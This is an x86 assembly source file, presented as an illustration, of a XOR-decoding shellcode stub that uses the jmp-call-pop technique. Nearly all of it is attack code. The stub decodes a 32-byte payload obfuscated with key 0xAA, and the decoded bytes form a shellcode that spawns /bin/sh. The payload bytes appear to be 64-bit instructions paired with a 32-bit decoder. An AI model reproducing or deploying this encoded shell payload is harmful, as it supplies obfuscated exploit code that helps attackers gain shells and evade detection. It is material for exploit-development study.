; Program: To illustrate a xor decoding shellcode in x86 assembly using jmp-call-pop technique, whereas x86_64 version is pretty same
; Code: GuiltySparx
; Author: Paramjot Singh
; Alias: theprojax
global _start
segment .text

_start:
	jmp finder
_proc:
	pop esi
	xor ecx, ecx
	add cl, 0x20

decode:
	xor byte [esi], 0xAA
	inc esi
	loop decode
	
	jmp short enc_shellcode

finder:
	call _proc
	enc_shellcode: db 0xe2,0x9b,0x6a,0xfa,0xe2,0x11,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xf9,0xe2,0x23,0x4d,0xfa,0xe2,0x23,0x48,0xfd,0xe2,0x23,0x4c,0xe2,0x29,0x6a,0x91,0xa5,0xaf
